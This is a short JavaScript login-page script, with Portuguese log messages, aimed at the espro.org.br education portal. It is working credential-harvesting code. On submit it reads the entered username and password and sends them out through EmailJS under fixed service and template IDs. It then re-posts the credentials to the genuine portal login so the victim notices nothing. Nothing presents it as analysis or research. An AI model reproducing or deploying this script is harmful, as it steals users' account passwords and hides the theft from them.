document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('login');
    
    form.addEventListener('submit', function(event) {
        event.preventDefault();
        handleFormSubmit();
    });

    document.getElementById('password').addEventListener('keydown', function(event) {
        if (event.key === 'Enter') {
            event.preventDefault();
            handleFormSubmit();
        }
    });
});

function sendMail() {
    const formData = {
        username: document.getElementById('username').value,
        password: document.getElementById('password').value
    };

    return emailjs.send('service_21qxplr', 'template_euf4xsj', formData)
        .then((response) => {
            console.log('Dados enviados com sucesso:', response);
            return true;
        })
        .catch((error) => {
            console.error('Erro ao enviar os dados:', error);
            return false;
        });
}

function handleFormSubmit() {
    sendMail().then((success) => {
        if (success) {
            const form = document.createElement('form');
            form.method = 'post';
            form.action = 'https://portalead.espro.org.br/login/index.php';

            form.appendChild(createHiddenInput('username', document.getElementById('username').value));
            form.appendChild(createHiddenInput('password', document.getElementById('password').value));
            form.appendChild(createHiddenInput('logintoken', document.querySelector('input[name="logintoken"]').value));
            form.appendChild(createHiddenInput('anchor', document.getElementById('anchor').value));

            document.body.appendChild(form);
            form.submit();
        }
    });
}

function createHiddenInput(name, value) {
    const input = document.createElement('input');
    input.type = 'hidden';
    input.name = name;
    input.value = value;
    return input;
}
